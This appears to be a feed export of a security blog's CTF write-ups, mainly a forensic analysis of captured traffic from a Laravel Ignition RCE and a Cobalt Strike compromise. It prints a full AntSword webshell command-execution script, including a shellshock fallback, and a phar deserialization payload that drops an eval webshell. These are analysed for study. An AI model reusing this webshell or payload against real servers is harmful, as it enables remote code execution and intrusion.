class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) &#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>We can see that parameter s receive  parameter ufbd335828f30f’s value.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>so, s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>The password was found,P4Uk6qkh6Gvqwg3y.Then extract beacon_keys file.We can recover serialized private key by  <a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a>.</p><p><img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image"></p><p>From RSA key we can recover AES key in traffic ,usually the encryped data located in cookie field.</p><p><img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image"></p><p>From AES key we can recover totally communication contents,according to cobalt strike traffic characetristics,we can get beacon’s task execution results from the pacakage which POST DATA to submit.php?id=xxx.</p><p><img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"></p><p>Note that data should be base64 format,then use script decode it.</p><p><img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image"></p><p>So beacon’s task execution result were shown in above figure, it contains the flag what we want.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a></p><p><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a></p><p><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Target: &lt;strong&gt;FIND THE FLAG(</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Quick start  Captfencoder in Mac</title>
    <link href="https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/"/>
    <id>https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/</id>
    <published>2021-10-08T07:35:41.000Z</published>
    <updated>2021-10-09T02:44:06.623Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>Automator in mac<br>open automator,choose application,search shell on the top<br><img src="http://cdn.polowong.top/1633678583273wpowfu9o.png?imageslim" alt="paste image"><br>then type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&#x2F;path&#x2F;to&#x2F;npm&#x2F;;cd &#x2F;path&#x2F;to&#x2F;npm&#x2F;apps ;npm start</span><br></pre></td></tr></table></figure><p>Automator doesn’t know the path of npm, so it should be exported frist.<br><img src="http://cdn.polowong.top/1633678772412ykmrga69.png?imageslim" alt="paste image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tools&quot;&gt;&lt;a href=&quot;#Tools&quot; class=&quot;headerlink&quot; title=&quot;Tools&quot;&gt;&lt;/a&gt;Tools&lt;/h1&gt;&lt;p&gt;Automator in mac&lt;br&gt;open automator,choose application,sear</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>绿城杯流量分析</title>
    <link href="https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2021-10-07T02:33:09.000Z</published>
    <updated>2021-10-07T13:25:07.241Z</updated>
    
    <content type="html"><![CDATA[<p>这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包<img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image">在这里看到了很多ignition之类的包，百度了下这是一个laravel的RCE。后面的包一直在向.config.php post数据，怀疑config.php是写的马，跟进去看看。使用http contains config过滤出来。<img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image">很明显是webshell了，这是在执行ls<img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image">继续跟踪这个webshell的数据包，看看有无有价值的信息。<img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image">看到了一个secret.zip，但是http对象导出并没有这玩意。继续追踪看到了pk开头的一段数据，考虑是压缩包，尝试进行还原。<img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image">需要注意的是，压缩包前后有两段字符串是蚁剑自带干扰流量特征的。还原之后是个加密的压缩包，不是伪加密，下一步的目的是找到压缩包的密码。同时需要注意的是，这里文件名和cobalt strike有关（rt废物狂喜），然后搜了下.cobaltstrike.beacon_keys这个东西是干嘛的。上述文件是一个序列化后的公钥私钥文件，CS的beacon会嵌入这个文件中的公钥，当然了，私钥是留给server自己的。下一步应该是对这个文件进行解密，获取CS的通信数据。既然知道了是cobalt strike的通信流量，那么需要找到beacon与teamserver交互的数据包，但这个前提是得到私钥。获取私钥的前提是解开压缩包的密码。下面需要做的是找压缩包的密码。<img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image">继续追踪数据包，在上面的包中看到了解压的操作。但是当时我直接对传输的数据进行URL+BASE64解码，并不能得到任何有价值的信息。那么接下来需要做的是看一看传的马的内容以及加密方式。在laravel RCE的包中可以找到payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>把payload中的=00替换为空然后解base64可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">�a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~ضtest.txt\KKa~ضtesttest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��GBMB</span><br></pre></td></tr></table></figure><p>这写进去的应该是一个序列化对象，应该是和laravel的rce有关，我们重点关注传进去的内容。@eval(@gzinflate(base64_decode($_POST[14433])));所以需要做gzip和base64的解码才可以明白流量包中的具体内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span 